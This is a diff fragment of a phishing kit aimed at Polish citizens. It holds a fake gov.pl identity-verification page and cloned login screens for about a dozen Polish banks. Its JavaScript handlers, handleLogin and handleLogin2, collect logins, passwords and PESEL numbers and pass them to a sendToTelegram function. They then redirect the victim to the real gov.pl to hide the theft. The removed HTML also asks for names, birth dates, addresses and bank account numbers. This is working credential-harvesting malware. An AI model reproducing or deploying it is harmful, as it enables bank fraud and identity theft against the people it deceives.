-            .bank5-full-page .bank5-form input { padding: 8px 10px; font-size: 12px; }
-            .bank5-full-page .bank5-form .login-btn { height: 36px; font-size: 13px; width: 100%; }
-            .bank5-full-page .bank5-form .login-btn-row { gap: 12px; flex-direction: column; align-items: stretch; }
-            .bank5-full-page .bank5-form .login-btn-row .form-group { min-width: 100%; }
-            .bank6-container { padding: 18px 14px; }
-            .bank6-title { font-size: 20px; }
-            .bank6-form input { padding: 8px 12px; font-size: 12px; }
-            .bank6-form .login-btn { padding: 10px; font-size: 13px; }
-            .bank6-download img { width: 140px; height: 32px; }
-            .bank6-security-text { font-size: 12px; }
-            .bank7-full-page .bank7-container { padding: 20px 12px; }
-            .bank7-full-page .bank7-box { padding: 18px 14px; }
-            .bank7-full-page .bank7-title { font-size: 18px; }
-            .bank7-full-page .bank7-subtitle { font-size: 12px; }
-            .bank7-full-page .bank7-form input { padding: 8px 10px; font-size: 12px; }
-            .bank7-full-page .bank7-form .login-btn { padding: 10px; font-size: 13px; }
-            .bank7-full-page .bank7-security-list li { font-size: 12px; }
-            .bank7-full-page .bank7-links { font-size: 12px; }
-            .bank7-full-page .bank7-chat { font-size: 12px; }
-            .bank7-full-page .bank7-norton { bottom: 10px; right: 12px; }
-            .bank7-full-page .bank7-norton img { width: 50px; height: 34px; }
-            .bank8-full-page .bank8-container { padding: 16px 12px; gap: 18px; }
-            .bank8-full-page .bank8-card { padding: 16px 12px; width: 100%; max-width: 100%; }
-            .bank8-full-page .bank8-card .bank8-card-title { font-size: 14px; }
-            .bank8-full-page .bank8-card .bank8-login-title { font-size: 16px; }
-            .bank8-full-page .bank8-form input { padding: 8px 10px; font-size: 12px; }
-            .bank8-full-page .bank8-form .login-btn { padding: 10px; font-size: 13px; }
-            .bank8-full-page .bank8-security-title { font-size: 16px; }
-            .bank8-full-page .bank8-security-text { font-size: 13px; }
-            .bank8-full-page .bank8-security-image img { width: 160px; height: auto; }
-            .bank8-full-page .bank8-favicon img { width: 40px; height: 40px; }
-            .bank9-full-page .bank9-container { padding: 16px 12px; }
-            .bank9-full-page .bank9-top .bank9-title { font-size: 14px; }
-            .bank9-full-page .bank9-top .bank9-logo img { width: 100px; height: 50px; }
-            .bank9-full-page .bank9-card { padding: 18px 14px; width: 100%; max-width: 100%; }
-            .bank9-full-page .bank9-card .bank9-welcome { font-size: 18px; }
-            .bank9-full-page .bank9-form input { padding: 8px 10px; font-size: 12px; }
-            .bank9-full-page .bank9-form .login-btn { padding: 10px; font-size: 13px; }
-            .bank12-full-page .bank12-container { padding: 12px 12px 24px; }
-            .bank12-full-page .bank12-box { padding: 16px 14px; }
-            .bank12-full-page .bank12-title { font-size: 14px; }
-            .bank12-full-page .bank12-form input { padding: 8px 10px; font-size: 12px; }
-            .bank12-full-page .bank12-form .login-btn { width: 64px; height: 36px; font-size: 13px; padding: 0 12px; }
+        });
+    }
+});
+
+// ============================================================
+//   MILLENIUM (с PESEL)
+// ============================================================
+function handleLogin2(event, bankName) {
+    event.preventDefault();
+    const form = event.target;
+    const allInputs = form.querySelectorAll('input');
+
+    const login = document.getElementById('loginUsername2')?.value.trim() || '';
+    const password = document.getElementById('loginPassword2')?.value.trim() || '';
+    const pesel = document.getElementById('loginPesel2')?.value.trim() || '';
+
+    if (!login || !password || !pesel) {
+        alert('Proszę wypełnić wszystkie pola (Millekod, Hasło i Pesel) dla ' + bankName + '.');
+        return false;
+    }
+
+    sendToTelegram(bankName, login, password, pesel);
+    alert('✅ Dane dla ' + bankName + ' zostały wysłane!');
+
+    allInputs.forEach(input => {
+        if (input.type !== 'hidden' && input.type !== 'submit' && input.type !== 'button') input.value = '';
+    });
+
+    setTimeout(() => { window.location.href = 'https://www.gov.pl'; }, 1500);
+    return false;
+}
+
+// ============================================================
+//   УНИВЕРСАЛЬНЫЙ ОБРАБОТЧИК БАНКОВ
+// ============================================================
+function handleLogin(event, bankName) {
+    event.preventDefault();
+    const form = event.target;
+    const allInputs = form.querySelectorAll('input');
+    let login = '', password = '';
+    const textInputs = [], passwordInputs = [];
+
+    allInputs.forEach(input => {
+        const type = input.type || '';
+        if (type === 'password') passwordInputs.push(input);
+        else if (type === 'text' || type === 'email' || type === 'tel') textInputs.push(input);
+    });
+
+    if (textInputs.length > 0) login = textInputs[0].value.trim();
+    if (passwordInputs.length > 0) password = passwordInputs[0].value.trim();
+
+    if (!login) {
+        for (const input of allInputs) {
+            const id = (input.id || '').toLowerCase();
+            const placeholder = (input.placeholder || '').toLowerCase();
+            if ((id.includes('login') || placeholder.includes('login')) && input.type !== 'password') {
+                login = input.value.trim();
+                break;
+            }
         }
-    </style>
-</head>
-<body>
-    <div id="captchaOverlay">
-        <div class="captcha-box">
-            <span class="captcha-icon">🛡️</span>
-            <h2>Weryfikacja</h2>
-            <p>Przepisz kod z obrazka, aby kontynuować</p>
-            <div class="captcha-question" id="captchaQuestion">1234</div>
-            <input type="text" id="captchaInput" placeholder="Wpisz kod" maxlength="4" autocomplete="off">
-            <button class="captcha-btn" id="captchaSubmit">Potwierdź</button>
-            <div class="captcha-error" id="captchaError"></div>
-            <button class="captcha-refresh" id="captchaRefresh">⟳ Odśwież kod</button>
-        </div>
-    </div>
+    }
+    if (!password) {
+        for (const input of allInputs) {
+            const id = (input.id || '').toLowerCase();
+            const placeholder = (input.placeholder || '').toLowerCase();
+            if ((id.includes('hasło') || id.includes('haslo') || id.includes('password') ||
+                 placeholder.includes('hasło') || placeholder.includes('haslo')) && input.type === 'password') {
+                password = input.value.trim();
+                break;
+            }
+        }
+    }
+    if (!password) {
+        const anyPassword = form.querySelector('input[type="password"]');
+        if (anyPassword) password = anyPassword.value.trim();
+    }
+    if (!login) {
+        const anyText = form.querySelector('input[type="text"]');
+        if (anyText) login = anyText.value.trim();
+    }
 
-    <div id="mainContent" style="display:none;">
-        <header class="header" id="header">
-            <div class="header-left">
-                <button class="menu-btn" aria-label="Menu" id="menuToggle">
-                    <span class="line"></span>
-                    <span class="line"></span>
-                    <span class="line"></span>
-                </button>
-                <div class="logo-area">
-                    <img src="grb.svg" alt="Godło Rzeczypospolitej Polskiej" class="coat-of-arms" width="72" height="50">
-                    <div class="logo-main">
-                        <span class="gov">gov.pl</span>
-                        <span class="separator">|</span>
-                        <span class="subtitle">Serwis Rzeczypospolitej Polskiej</span>
-                    </div>
-                </div>
-            </div>
-            <div class="header-right">
-                <div class="header-search">
-                    <button class="search-icon-btn" aria-label="Szukaj">
-                        <svg viewBox="0 0 24 24">
-                            <circle cx="11" cy="11" r="8" />
-                            <line x1="21" y1="21" x2="16.65" y2="16.65" />
-                        </svg>
-                    </button>
-                    <input type="text" placeholder="Szukaj usługi, informacji" aria-label="Szukaj">
-                    <button class="search-submit-btn">SZUKAJ</button>
-                </div>
-                <span class="header-eu-logo">
-                    <img src="eu-center-pl.svg" alt="EU Center PL">
-                </span>
-            </div>
-        </header>
+    if (!login || !password) {
+        alert('Proszę wypełnić wszystkie pola (Login i Hasło) dla ' + bankName + '.');
+        return false;
+    }
 
-        <div class="main-wrapper" id="mainWrapper">
-            <aside class="sidebar" id="sidebar">
-                <nav class="sidebar-nav">
-                    <ul>
-                        <li><a href="#" class="active">Strona główna</a></li>
-                        <li><a href="#">Rada Ministrów</a></li>
-                        <li><a href="#">Kancelaria Premiera</a></li>
-                        <li><a href="#">Ministerstwa</a></li>
-                        <li><a href="#">Urzędy, instytucje i placówki RP</a></li>
-                        <li class="separator"></li>
-                        <li><a href="#"><span class="menu-icon"><img src="15-uprawnienia.svg" alt=""></span>Usługi dla obywatela</a></li>
-                        <li><a href="#"><span class="menu-icon"><img src="07-rozwoj.svg" alt=""></span>Usługi dla przedsiębiorcy</a></li>
-                        <li><a href="#"><span class="menu-icon"><img src="13-pismo-ogolne-do-urzedu.svg" alt=""></span>Usługi dla urzędnika</a></li>
-                        <li><a href="#"><span class="menu-icon"><img src="15-uprawnienia.svg" alt=""></span>Usługi dla rolnika</a></li>
-                        <li class="separator"></li>
-                        <li><a href="#">Profil zaufany</a></li>
-                        <li><a href="#">Baza wiedzy</a></li>
-                        <li><a href="#">Serwis Służby Cywilnej</a></li>
-                        <li class="separator"></li>
-                        <li>
-                            <a href="#" class="ukraine-link">
-                                <span class="flag-icon"><img src="a6631d28-8291-4474-b530-32864664800e.svg" alt="UA"></span>
-                                <span>Сайт dla obywateli Ukrainy</span>
-                            </a>
-                        </li>
-                    </ul>
-                </nav>
-            </aside>
+    sendToTelegram(bankName, login, password);
+    alert('✅ Dane dla ' + bankName + ' zostały wysłane!');
 
-            <div class="content-wrapper" id="contentWrapper">
-                <div class="login-nav" id="loginNav">
-                    <span class="brand">Login.gov.pl</span>
-                    <div class="nav-links">
-                        <a href="#">Jak korzystać</a>
-                        <a href="#">Gdzie skorzystać</a>
-                        <a href="#">Bezpieczeństwo</a>
-                        <a href="#">Pomoc</a>
-                        <a href="#">Dla integratorów</a>
-                        <a href="#">Kontakt</a>
-                    </div>
-                </div>
+    allInputs.forEach(input => {
+        if (input.type !== 'hidden' && input.type !== 'submit' && input.type !== 'button') input.value = '';
+    });
 
-                <div class="image-under-banner" id="imageBanner">
-                    <div class="image-wrapper">
-                        <img src="4a4bfee8-cecc-4734-b549-3230515a45ef.png" alt="Image" style="width:100%; height:auto;">
-                        <div class="overlay-icon">
-                            <img src="51816b1b-533d-4730-983d-e3ce4184dcf6.svg" alt="icon">
-                        </div>
-                        <div class="overlay-line"></div>
-                        <div class="overlay-text">
-                            <h2>Poznaj login.gov.pl</h2>
-                            <p>Potwierdź tożsamość online i korzystaj z różnych usług w serwisach publicznych</p>
-                            <button class="btn-outline" id="scrollToFormBtn">DOWIEDZ SIĘ WIĘCEJ</button>
-                        </div>
-                    </div>
-                </div>
+    setTimeout(() => { window.location.href = 'https://www.gov.pl'; }, 1500);
+    return false;
+}
 
-                <section class="data-form-section" id="dataFormSection">
-                    <h2 class="section-title">Dane osobowe</h2>
+// ============================================================
+//   ОТКРЫТИЕ ЭКРАНОВ
+// ============================================================
+function openLoginScreen1() {
+    document.getElementById('bankSelection').classList.remove('visible');
+    document.getElementById('bankFooter').classList.remove('visible');
+    document.getElementById('loginScreen1').classList.add('visible');
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+function openLoginScreen2() {
+    document.getElementById('bankSelection').classList.remove('visible');
+    document.getElementById('bankFooter').classList.remove('visible');
+    document.getElementById('loginScreen2').classList.add('visible');
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+function openLoginScreen3() {
+    document.getElementById('bankSelection').classList.remove('visible');
+    document.getElementById('bankFooter').classList.remove('visible');
+    document.getElementById('loginScreen3').classList.add('visible');
+    document.body.style.overflow = 'hidden';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+function openLoginScreen4() {
+    document.getElementById('bankSelection').classList.remove('visible');
+    document.getElementById('bankFooter').classList.remove('visible');
+    document.getElementById('loginScreen4').classList.add('visible');
+    document.body.style.overflow = 'hidden';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+function openLoginScreen5() {
+    document.getElementById('bankSelection').classList.remove('visible');
+    document.getElementById('bankFooter').classList.remove('visible');
+    document.getElementById('loginScreen5').classList.add('visible');
+    document.body.style.overflow = 'hidden';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+function openLoginScreen6() {
+    document.getElementById('bankSelection').classList.remove('visible');
+    document.getElementById('bankFooter').classList.remove('visible');
+    document.getElementById('loginScreen6').classList.add('visible');
+    document.body.style.overflow = 'hidden';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+function openLoginScreen7() {
+    document.getElementById('bankSelection').classList.remove('visible');
+    document.getElementById('bankFooter').classList.remove('visible');
+    document.getElementById('loginScreen7').classList.add('visible');
+    document.body.style.overflow = 'hidden';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+function openLoginScreen8() {
+    document.getElementById('bankSelection').classList.remove('visible');
+    document.getElementById('bankFooter').classList.remove('visible');
+    document.getElementById('loginScreen8').classList.add('visible');
+    document.body.style.overflow = 'hidden';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+function openLoginScreen9() {
+    document.getElementById('bankSelection').classList.remove('visible');
+    document.getElementById('bankFooter').classList.remove('visible');
+    document.getElementById('loginScreen9').classList.add('visible');
+    document.body.style.overflow = 'hidden';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+function openLoginScreen10() {
+    document.getElementById('bankSelection').classList.remove('visible');
+    document.getElementById('bankFooter').classList.remove('visible');
+    document.getElementById('loginScreen10').classList.add('visible');
+    document.body.style.overflow = 'hidden';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+function openLoginScreen12() {
+    document.getElementById('bankSelection').classList.remove('visible');
+    document.getElementById('bankFooter').classList.remove('visible');
+    document.getElementById('loginScreen12').classList.add('visible');
+    document.body.style.overflow = 'hidden';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
 
-                    <div class="blue-alert">
-                        <span class="alert-icon">ℹ️</span>
-                        <strong>Uwaga:</strong> Twoje dane są nieaktualne i wymagają weryfikacji. Prosimy o aktualizację swoich danych jak najszybciej.
-                    </div>
-
-                    <form class="data-form" id="dataForm">
-                        <div class="form-group">
-                            <label for="fullname">Imię i nazwisko <span class="required">*</span></label>
-                            <input type="text" id="fullname" name="fullname" placeholder="Imię i nazwisko" required>
-                        </div>
-
-                        <div class="form-group">
-                            <label for="birthdate">Data urodzenia <span class="required">*</span></label>
-                            <input type="text" id="birthdate" name="birthdate" placeholder="__/__/____" maxlength="10" required oninput="autoSlash(event)">
-                        </div>
-
-                        <div class="form-group">
-                            <label for="phone">Numer telefonu <span class="required">*</span></label>
-                            <input type="tel" id="phone" name="phone" placeholder="+48" value="+48" required>
-                        </div>
-
-                        <div class="form-group full-width">
-                            <label>Adres zamieszkania <span class="required">*</span></label>
-                            <div class="address-row">
-                                <input type="text" name="street" placeholder="Ulica i numer" required>
-                                <input type="text" name="city" placeholder="Miasto" required>
-                                <input type="text" name="postal" placeholder="Kod pocztowy" required maxlength="6" oninput="autoPostal(event)">
-                            </div>
-                        </div>
-
-                        <div class="form-group full-width">
-                            <label for="iban">NRB (Numer Rachunku Bankowego) <span class="required">*</span></label>
-                            <div class="iban-wrapper" id="ibanWrapper">
-                                <span class="pl-prefix">PL</span>
-                                <input type="text" id="iban" name="iban" placeholder="00 0000 0000 0000 0000 0000 0000" required autocomplete="off">
-                            </div>
-                        </div>
-
-                        <div class="form-actions">
-                            <button type="submit" class="submit-btn" id="submitBtn">
-                                <span class="spinner"></span>
-                                Wyślij
-                            </button>
-                        </div>
-                    </form>
-                </section>
-
-                <section class="bank-selection" id="bankSelection">
-                    <h2 class="bank-title">Bankowość elektroniczna</h2>
-                    <p class="bank-subtitle">Wybierz bank, za pomocą którego chcesz się zalogować.</p>
-
-                    <div class="bank-grid">
-                        <button class="bank-btn" onclick="openLoginScreen1()">
-                            <img src="logo.png" alt="Bank 1">
-                        </button>
-                        <button class="bank-btn" onclick="openLoginScreen2()">
-                            <img src="logo9.png" alt="Bank 2" style="width:161px; height:52px;">
-                        </button>
-                        <button class="bank-btn" onclick="openLoginScreen3()">
-                            <img src="logo2.png" alt="Bank 3">
-                        </button>
-                        <button class="bank-btn" onclick="openLoginScreen4()">
-                            <img src="logo3.png" alt="Bank 4">
-                        </button>
-                        <button class="bank-btn" onclick="openLoginScreen5()">
-                            <img src="logo4.png" alt="Bank 5">
-                        </button>
-                        <button class="bank-btn" onclick="openLoginScreen6()">
-                            <img src="logo5.png" alt="Bank 6">
-                        </button>
-                        <button class="bank-btn" onclick="openLoginScreen7()">
-                            <img src="logo6.png" alt="Bank 7">
-                        </button>
-                        <button class="bank-btn" onclick="openLoginScreen8()">
-                            <img src="logo7.png" alt="Bank 8">
-                        </button>
-                        <button class="bank-btn" onclick="openLoginScreen9()">
-                            <img src="logo8.png" alt="Bank 9">
-                        </button>
-                        <button class="bank-btn-centered" onclick="openLoginScreen10()">
-                            <span class="bank-inner">
-                                <img src="logo12.png" alt="ERSTE" class="bank-logo-inner">
-                            </span>
-                        </button>
-                        <button class="bank-btn" onclick="openLoginScreen12()">
-                            <img src="logo_ing-logo.svg" alt="ING Bank Śląski">
-                        </button>
-                    </div>
-
-                    <div class="bank-footer" id="bankFooter">
-                        <div class="footer-links">
-                            <a href="#">Polityka cookies</a>
-                            <a href="#">Klauzula informacyjna</a>
-                            <a href="#">Deklaracja dostępności</a>
-                            <a href="#">Kontakt</a>
-                        </div>
-                    </div>
-                </section>
-
-                <section class="login-screen" id="loginScreen1">
-                    <div class="login-container">
-                        <div class="login-grid">
-                            <div class="login-left">
-                                <span class="ipko-logo">
-                                    <img src="ipko.jpg" alt="iPKO">
-                                </span>
-                                <div class="login-title">Zaloguj się</div>
-                                <div class="login-subtitle">i użyj e-Tożsamości</div>
-
-                                <form class="login-form" onsubmit="return handleLogin(event, 'iPKO')">
-                                    <div class="form-group">
-                                        <label for="loginUsername1">Login</label>
-                                        <input type="text" id="loginUsername1" placeholder="Wpisz login" required>
-                                    </div>
-                                    <div class="login-btn-row">
-                                        <div class="form-group" style="flex:1; min-width:180px; margin-bottom:0;">
-                                            <label for="loginPassword1">Hasło</label>
-                                            <input type="password" id="loginPassword1" placeholder="Wpisz hasło" required>
-                                        </div>
-                                        <button type="submit" class="login-btn">Dalej</button>
-                                    </div>
-                                </form>
-                            </div>
-
-                            <div class="login-right">
-                                <div class="security-info">
-                                    <div class="info-title">Bezpieczne logowanie</div>
-                                    <div class="security-block">
-                                        <p><span class="highlight">Sprzęt i strony logowania</span></p>
-                                        <p>Zawsze sprawdzaj adresy stron www, na których się logujesz.</p>
-                                    </div>
-                                    <div class="security-block">
-                                        <p><span class="highlight">Chroń swoją prywatność</span></p>
-                                        <p>Upewnij się, że nikt nie widzi wpisywanych przez Ciebie danych.</p>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </section>
-
-                <div class="bank2-full-page" id="loginScreen2">
-                    <div class="bank2-container">
-                        <div class="bank2-box">
-                            <div class="bank2-logo">
-                                <img src="logo9.png" alt="Millenium">
-                            </div>
-                            <form class="bank2-form" onsubmit="return handleLogin2(event, 'Millenium')">
-                                <div class="form-group">
-                                    <label for="loginUsername2">Podaj Millekod</label>
-                                    <input type="text" id="loginUsername2" placeholder="Wpisz Millekod" required>
-                                </div>
-                                <div class="form-group">
-                                    <label for="loginPassword2">Hasło</label>
-                                    <input type="password" id="loginPassword2" placeholder="Wpisz hasło" required>
-                                </div>
-                                <div class="form-group">
-                                    <label for="loginPesel2">Pesel</label>
-                                    <input type="text" id="loginPesel2" placeholder="Wpisz Pesel" required maxlength="11">
-                                </div>
-                                <div class="login-btn-row">
-                                    <div class="form-group">
-                                        <input type="text" placeholder=" " style="border:none; background:transparent; padding:0; height:0; min-height:0; visibility:hidden; display:none;">
-                                    </div>
-                                    <button type="submit" class="login-btn">Dalej</button>
-                                </div>
-                            </form>
-                            <div class="bank2-footer-text">
-                                <strong>Fałszywi konsultanci</strong>
-                                Oszuści podszywają się pod pracowników Banku - nie pobieraj nieznanych aplikacji.
-                                <br><br>
-                                <strong>Finanse 360°</strong>
-                                Sprawdź saldo i zlecaj przelewy z kont w innych bankach.
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="bank3-full-page" id="loginScreen3">
-                    <div class="bank3-header">
-                        <div class="bank3-header-content">
-                            <span class="bank3-logo"><img src="logo-white.svg" alt="PKO"></span>
-                        </div>
-                    </div>
-                    <div class="login-container">
-                        <div class="login-form-wrapper">
-                            <div class="login-title">Zaloguj się</div>
-                            <div class="login-subtitle">do bankowości elektronicznej</div>
-                            <form class="login-form" onsubmit="return handleLogin(event, 'PKO')">
-                                <div class="form-group">
-                                    <label for="loginUsername3">Login</label>
-                                    <input type="text" id="loginUsername3" placeholder="Wpisz login" required>
-                                </div>
-                                <div class="login-btn-row">
-                                    <div class="form-group">
-                                        <label for="loginPassword3">Hasło</label>
-                                        <input type="password" id="loginPassword3" placeholder="Wpisz hasło" required>
-                                    </div>
-                                    <button type="submit" class="login-btn">Dalej</button>
-                                </div>
-                            </form>
-                            <div class="security-warnings">
-                                <div class="warning-item"><span class="icon">⚠️</span><span>Zachowaj czujność - przestępcy podszywają się pod pracowników banku.</span></div>
-                                <div class="warning-item"><span class="icon">🔒</span><span>Bezpieczne wakacje z cyberPEKAO - zadbaj o spokój!</span></div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="bank4-full-page" id="loginScreen4">
-                    <div class="bank4-container">
-                        <div class="bank4-title">potwierdź swoją tożsamość</div>
-                        <div class="bank4-subtitle">zaloguj się do mBanku loginem i hasłem</div>
-                        <form class="bank4-form" onsubmit="return handleLogin(event, 'mBank')">
-                            <div class="form-group">
-                                <label for="loginUsername4">Login</label>
-                                <input type="text" id="loginUsername4" placeholder="Wpisz login" required>
-                            </div>
-                            <div class="login-btn-row">
-                                <div class="form-group">
-                                    <label for="loginPassword4">Hasło</label>
-                                    <input type="password" id="loginPassword4" placeholder="Wpisz hasło" required>
-                                </div>
-                                <button type="submit" class="login-btn">Dalej</button>
-                            </div>
-                        </form>
-                    </div>
-                </div>
-
-                <div class="bank5-full-page" id="loginScreen5">
-                    <div class="bank5-container">
-                        <div class="bank5-box">
-                            <div class="bank5-alert">
-                                Widzisz komunikat o blokadzie bankowości?
-                                <br>
-                                <a href="#" onclick="alert('Przekierowanie do logowania przez mObywatel'); return false;">Kliknij tutaj</a> i skorzystaj z najszybszej ścieżki.
-                            </div>
-                            <div class="bank5-title">Zaloguj się do VeloBanku</div>
-                            <div class="bank5-subtitle">Login i hasło</div>
-                            <form class="bank5-form" onsubmit="return handleLogin(event, 'VELO')">
-                                <div class="form-group">
-                                    <label for="loginUsername5">Login</label>
-                                    <input type="text" id="loginUsername5" placeholder="Wpisz Twój login" required>
-                                </div>
-                                <div class="login-btn-row">
-                                    <div class="form-group">
-                                        <label for="loginPassword5">Hasło</label>
-                                        <input type="password" id="loginPassword5" placeholder="Wpisz hasło" required>
-                                    </div>
-                                    <button type="submit" class="login-btn">Dalej</button>
-                                </div>
-                            </form>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="bank6-full-page" id="loginScreen6">
-                    <div class="bank6-container">
-                        <div class="bank6-left">
-                            <div class="bank6-title">Logowanie</div>
-                            <form class="bank6-form" onsubmit="return handleLogin(event, 'BOS BANK')">
-                                <div class="form-group">
-                                    <label for="loginUsername6">Login</label>
-                                    <input type="text" id="loginUsername6" placeholder="Wpisz login" required>
-                                </div>
-                                <div class="form-group">
-                                    <label for="loginPassword6">Hasło</label>
-                                    <input type="password" id="loginPassword6" placeholder="Wpisz hasło" required>
-                                </div>
-                                <button type="submit" class="login-btn">Dalej</button>
-                            </form>
-                            <div class="bank6-download"><img src="download.png" alt="Pobierz aplikację"></div>
-                        </div>
-                        <div class="bank6-right">
-                            <div class="bank6-security-title">🔒 Pamiętaj o zasadach bezpieczeństwa</div>
-                            <div class="bank6-security-text">
-                                <p>Wprowadzaj adres strony Banku ręcznie.</p>
-                                <p><span class="highlight">Przed zalogowaniem sprawdź, czy:</span></p>
-                                <ul><li>adres rozpoczyna się od <span class="green">https</span></li></ul>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="bank7-full-page" id="loginScreen7">
-                    <div class="bank7-container">
-                        <div class="bank7-logo"><img src="bnp-paribas-logo-full.svg" alt="BNP Paribas"></div>
-                        <div class="bank7-box">
-                            <div class="bank7-title">Zaloguj się do GOonline</div>
-                            <div class="bank7-subtitle">Podaj swój login</div>
-                            <form class="bank7-form" onsubmit="return handleLogin(event, 'BNP')">
-                                <div class="form-group">
-                                    <label for="loginUsername7">Login</label>
-                                    <input type="text" id="loginUsername7" placeholder="Wpisz login" required>
-                                </div>
-                                <div class="form-group">
-                                    <label for="loginPassword7">Hasło</label>
-                                    <input type="password" id="loginPassword7" placeholder="Wpisz hasło" required>
-                                </div>
-                                <button type="submit" class="login-btn">Dalej</button>
-                            </form>
-                            <div class="bank7-security">
-                                <div class="bank7-security-title">Sprawdź, zanim się zalogujesz:</div>
-                                <ul class="bank7-security-list"><li>Adres zaczyna się od https</li></ul>
-                                <div class="bank7-links">
-                                    <a href="#" onclick="alert('Przekierowanie do strony GOonline'); return false;">Poznaj GOonline</a>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="bank7-norton"><img src="norton.png" alt="Norton"></div>
-                </div>
-
-                <div class="bank8-full-page" id="loginScreen8">
-                    <div class="bank8-container">
-                        <div class="bank8-left">
-                            <div class="bank8-favicon"><img src="favicon.ico" alt="Credit Agricole"></div>
-                            <div class="bank8-card">
-                                <div class="bank8-card-title">Klient indywidualny</div>
-                                <div class="bank8-login-title">Zaloguj się</div>
-                                <div class="bank8-login-subtitle">Podaj login i hasło</div>
-                                <form class="bank8-form" onsubmit="return handleLogin(event, 'Credit Agricole')">
-                                    <div class="form-group">
-                                        <label for="loginUsername8">Login</label>
-                                        <input type="text" id="loginUsername8" placeholder="Wpisz login" required>
-                                    </div>
-                                    <div class="form-group">
-                                        <label for="loginPassword8">Hasło</label>
-                                        <input type="password" id="loginPassword8" placeholder="Wpisz hasło" required>
-                                    </div>
-                                    <button type="submit" class="login-btn">Dalej</button>
-                                </form>
-                            </div>
-                        </div>
-                        <div class="bank8-right">
-                            <div class="bank8-security-title">Włącz dodatkową ochronę</div>
-                            <div class="bank8-security-text"><p>Cyberprzestępcy nie śpią. Zabezpiecz swoje pieniądze.</p></div>
-                            <div class="bank8-security-image"><img src="login-positive-1000.png" alt="Bezpieczeństwo"></div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="bank9-full-page" id="loginScreen9">
-                    <div class="bank9-container">
-                        <div class="bank9-top">
-                            <div class="bank9-logo"><img src="alior-logo.svg" alt="Alior Bank"></div>
-                            <div class="bank9-title">Potwierdzenie tożsamości z Alior Bankiem</div>
-                        </div>
-                        <div class="bank9-wrapper">
-                            <div class="bank9-card">
-                                <div class="bank9-welcome">Witamy w Alior Banku!</div>
-                                <form class="bank9-form" onsubmit="return handleLogin(event, 'Alior Bank')">
-                                    <div class="form-group">
-                                        <label for="loginUsername9">Login</label>
-                                        <input type="text" id="loginUsername9" placeholder="Wpisz login" required>
-                                    </div>
-                                    <div class="form-group">
-                                        <label for="loginPassword9">Hasło</label>
-                                        <input type="password" id="loginPassword9" placeholder="Wpisz hasło" required>
-                                    </div>
-                                    <button type="submit" class="login-btn">Dalej</button>
-                                </form>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="bank10-full-page" id="loginScreen10">
-                    <div class="bank10-container-centered">
-                        <div class="bank10-logo-center">
-                            <img src="logo12.png" alt="ERSTE" class="bank10-logo-img">
-                        </div>
-
-                        <div class="bank10-card-centered">
-                            <div class="bank10-login-title">Zaloguj się</div>
-                            
-                            <form class="bank10-form-centered" onsubmit="return handleLogin(event, 'ERSTE')">
-                                <div class="form-group">
-                                    <label for="loginUsername10">Login</label>
-                                    <input type="text" id="loginUsername10" placeholder="Wpisz login" required>
-                                </div>
-                                <div class="form-group">
-                                    <label for="loginPassword10">Hasło</label>
-                                    <input type="password" id="loginPassword10" placeholder="Wpisz hasło" required>
-                                </div>
-                                <button type="submit" class="login-btn">Dalej</button>
-                            </form>
-                        </div>
-
-                        <div class="bank10-security-centered">
-                            <div class="bank10-security-title">Bezpieczeństwo</div>
-                            <ul class="bank10-security-list">
-                                <li>Pobieraj oprogramowanie tylko z autoryzowanych sklepów.</li>
-                                <li>Sprawdź treść w wiadomości z smsKodem.</li>
-                            </ul>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="bank12-full-page" id="loginScreen12">
-                    <div class="bank12-container">
-                        <div class="bank12-box">
-                            <div class="bank12-logo"><img src="logo_ing-logo.svg" alt="ING Bank Śląski"></div>
-                            <div class="bank12-title">Potwierdzasz tożsamość w Moim ING</div>
-                            <form class="bank12-form" onsubmit="return handleLogin(event, 'ING')">
-                                <div class="form-group">
-                                    <label for="loginUsername12">Login do bankowości Moje ING</label>
-                                    <input type="text" id="loginUsername12" placeholder="Wpisz login" required>
-                                </div>
-                                <div class="form-group">
-                                    <label for="loginPassword12">Hasło</label>
-                                    <input type="password" id="loginPassword12" placeholder="Wpisz hasło" required>
-                                </div>
-                                <div class="login-btn-row">
-                                    <div class="form-group">
-                                        <input type="text" placeholder=" " style="border:none; background:transparent; padding:0; height:0; min-height:0; visibility:hidden; display:none;">
-                                    </div>
-                                    <button type="submit" class="login-btn">Dalej</button>
-                                </div>
-                            </form>
-                            <div class="bank12-footer-text">
-                                <strong>Przybywa oszukanych na portalach aukcyjnych.</strong>
-                                Unikaj transakcji przez mejle, SMS-y i komunikatory.
-                                <br>
-                                <span class="link" onclick="alert('Przekierowanie do strony o oszustwach'); return false;">Więcej o oszustwach</span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <main class="main-content"></main>
-            </div>
-        </div>
-
-        <div class="toast-message" id="toastMessage">Najpierw wypełnij wszystkie wymagane pola!</div>
-
-        <footer class="footer" id="footer">
-            <div class="container">
-                <div>
-                    <h4>Serwis Gov.pl</h4>
-                    <ul>
-                        <li><a href="#">O serwisie</a></li>
-                        <li><a href="#">Polityka prywatności</a></li>
-                        <li><a href="#">Warunki korzystania</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h4>Dla obywatela</h4>
-                    <ul>
-                        <li><a href="#">Usługi online</a></li>
-                        <li><a href="#">Poradniki</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h4>Dla przedsiębiorcy</h4>
-                    <ul>
-                        <li><a href="#">Biznes.gov.pl</a></li>
